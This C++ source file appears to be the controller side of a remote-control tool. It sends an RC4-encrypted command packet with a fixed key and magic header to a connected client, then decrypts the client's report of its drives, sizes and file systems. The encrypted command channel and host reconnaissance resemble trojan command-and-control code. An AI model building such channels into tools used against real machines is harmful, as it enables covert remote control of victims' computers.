#include "DiskInfoExtractor.h"
#include "rc4crpt.h"
#include "utils.h"
#include <iostream>

#define LEN_DATA 22

using namespace std;
bool DiskInfoExtractor::isMatch()
{
    if (((char*)this->parsedData.getAddressOfIndex(0))[0] == 103) {
        return true;
    }
    
    return false;
}

diskinfo* DiskInfoExtractor::getDiskInfo()
{
   
    int i = 1,j = 0;
    while (i<this->parsedData.getDataLen()) {
        char * rootName = (char *)this->parsedData.getAddressOfIndex(i);
        info[j].lpRootPathName = rootName[0];
        i++;

        byte* driveType = (byte*)this->parsedData.getAddressOfIndex(i);
        info[j].driveType = driveType[0];
        i++;

        int* totalMBs = (int*)this->parsedData.getAddressOfIndex(i);
        info[j].totalMBs = *totalMBs;
        i += 4;

        int* FreeMBs = (int*)this->parsedData.getAddressOfIndex(i);
        info[j].FreeMBs = *FreeMBs;
        i += 4;

        char * szTypeName = (char*)this->parsedData.getAddressOfIndex(i);
        strcpy_s(info[j].typeName, MAX_PATH, szTypeName);
        i += strlen(szTypeName)+1;

        char* szFileSystemName = (char*)this->parsedData.getAddressOfIndex(i);
        strcpy_s(info[j].szFileSystemName, MAX_PATH, szFileSystemName);
        i += strlen(szFileSystemName)+1;
        j++;
    }
    diskCount = j;
    return info;
}


SOCKET getDiskInfo(SOCKET clientSocket, SOCKET serverSocket) {

    char msg[8192];//存储传送的消息
    sockaddr_in client_sin;
    int len = sizeof(client_sin);

    cout << "您选择的是获取磁盘信息功能" << endl;
    char keyAry[256];
    string data = { 0x4B,0x75,0x47,0x6F,0x75,LEN_DATA,0x00,0x00,0x00,LEN_DATA,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x03,0x1C,0x00,0x00 };

    rc4_init(keyAry, (char*)RC4_KEY, strlen(RC4_KEY));
    rc4_cryp(keyAry, (char*)data.c_str(), LEN_DATA);
    //getline(cin, data);
    const char* sendData;
    sendData = data.c_str();
    cout << "发送指令中" << endl;
    send(clientSocket, sendData, LEN_DATA, 0);

    clientSocket = accept(serverSocket, (sockaddr*)&client_sin, &len);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Accept error" << endl;

        return 0;
    }

    while (true) {
        DiskInfoExtractor extractor;
        int num = recv(clientSocket, msg, 8192, 0);
        if (num == 0) break;
        extractor.decryptData(msg, num);
        int ret = extractor.parse_data();
        std::cout << "客户端说" << extractor.parsedData.getAddressOfIndex(0) << endl;
        if (ret && extractor.isMatch()) {
            std::cout << "获取磁盘信息成功" << endl;
            diskinfo* info = extractor.getDiskInfo();

            for (int i = 0; i < extractor.diskCount; i++) {
                std::cout << info[i].lpRootPathName << "  " << (int)info[i].driveType << "  " << info[i].totalMBs << "  " << info[i].FreeMBs << "  " << info[i].typeName << "  " << info[i].szFileSystemName << std::endl;
            }
            break;
        }
    }
    return clientSocket;
}

